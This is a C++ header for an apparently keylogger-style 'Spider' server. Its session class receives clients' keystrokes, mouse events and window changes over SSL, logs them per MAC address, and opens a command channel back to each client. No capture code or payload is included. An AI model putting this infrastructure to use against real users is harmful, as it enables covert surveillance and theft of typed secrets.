//
// Created by doom on 28/09/17.
//

#ifndef SPIDER_SERVER_SPIDERCLIENTSESSION_HPP
#define SPIDER_SERVER_SPIDERCLIENTSESSION_HPP

#include <Server/CommandableSession.hpp>
#include <Logging/LogModule.hpp>

namespace spi
{
    class SpiderClientSession : public CommandableSession
    {
    public:
        using Pointer = boost::shared_ptr<SpiderClientSession>;

        template <typename ...Args>
        static auto createShared(Args &&...args)
        {
            return CommandableSession::create<SpiderClientSession>(std::forward<Args>(args)...);
        }

        SpiderClientSession(net::IOManager &io, net::SSLContext &ctx,
                            const std::string &logRoot,
                            LogModule *handle) :
            CommandableSession(io, ctx, "client-sessions"),
            _logHandle(handle),
            _commandConn(io, ctx)
        {
            _cmdHandler.onMessages(boost::bind(&SpiderClientSession::__logMessage, this, _1),
                                   proto::MessageType::MouseClick,
                                   proto::MessageType::MouseMove,
                                   proto::MessageType::KeyEvent,
                                   proto::MessageType::ReplyCode);
            _cmdHandler.onMessages(boost::bind(&SpiderClientSession::__handleWindowChange, this, _1),
                                   proto::MessageType::WindowChange);
            _cmdHandler.onMessages(boost::bind(&SpiderClientSession::__handleHello, this, _1),
                                   proto::MessageType::Hello);
            _logHandle->setRoot(logRoot);
        }

        ~SpiderClientSession() noexcept override
        {
            delete _logHandle;
        }

        void startSession() noexcept
        {
            _log(logging::Level::Debug) << "Starting new session" << std::endl;
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&SpiderClientSession::handleHandshake,
                                       shared_from_this_cast<SpiderClientSession>(), net::ErrorPlaceholder));
        }

    private:
        void __logMessage(const ILoggable &l)
        {
            if (unlikely(!_identified)) {
                _log(logging::Level::Warning) << "Rejecting log request from unidentified client" << std::endl;
            } else {
                _log(logging::Level::Debug) << l.stringify() << std::endl;
                _logHandle->appendEntry(l);
            }
        }

        void __handleWindowChange(const ILoggable &wc)
        {
            _log(logging::Level::Debug) << wc.stringify() << std::endl;
            _logHandle->appendEntry(wc);
        }

        void __handleHello(const ILoggable &l)
        {
            const proto::Hello &hello = static_cast<const proto::Hello &>(l);

            _log(logging::Level::Debug) << "Saying hello to " << hello.macAddress.toString() << std::endl;
            _log(logging::Level::Debug) << "Using version " << hello.version << std::endl;
            _logHandle->setID(hello.macAddress.toString());
            _logHandle->setup();
            _id.setRaw(hello.macAddress.raw());
            _identified = true;
            _logHandle->appendEntry(hello);
            _commandConn.asyncConnect(_conn.getRemoteAddress(), hello.port,
                                      boost::bind(&SpiderClientSession::__handleCommandConnect,
                                                  shared_from_this_cast<SpiderClientSession>(),
                                                  spi::net::ErrorPlaceholder));
        }

        /** Command connection helpers */

        void __handleCommandSSLHandshake(const ErrorCode &ec)
        {
            if (!ec) {
                _hasCommandConn = true;
                _log(logging::Level::Debug) << "Successfully obtained a command channel with client" << std::endl;
            } else {
                _log(logging::Level::Warning) << "Unable to obtain a command channel with client"
                                              << ec.message() << std::endl;
            }
        }

        void __handleCommandConnect(const ErrorCode &ec)
        {
            if (!ec) {
                _commandConn.asyncHandshake(net::SSLConnection::HandshakeType::Client,
                                            boost::bind(&SpiderClientSession::__handleCommandSSLHandshake,
                                                        shared_from_this_cast<SpiderClientSession>(),
                                                        net::ErrorPlaceholder));
            } else {
                _log(logging::Level::Warning) << "Unable to obtain a command channel with client: "
                                              << ec.message() << std::endl;
            }
        }

    public:
        void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
        {
            Buffer buff;

            l.serialize(buff);
            _commandConn.writeSome(buff, ec);
            if (ec) {
                _log(logging::Level::Warning) << "Unable to send command to client: " << ec.message() << std::endl;
            }
        }

        bool hasCommandConn() const noexcept
        {
            return _hasCommandConn;
        }

        net::SSLConnection &getCommandConn() noexcept
        {
            return _commandConn;
        }

        const ::net::MACAddress getID() const noexcept
        {
            return _id;
        }

    private:
        LogModule *_logHandle;
        bool _identified{false};
        ::net::MACAddress _id;

        net::SSLConnection _commandConn;
        bool _hasCommandConn{false};
    };
}

#endif //SPIDER_SERVER_SPIDERCLIENTSESSION_HPP
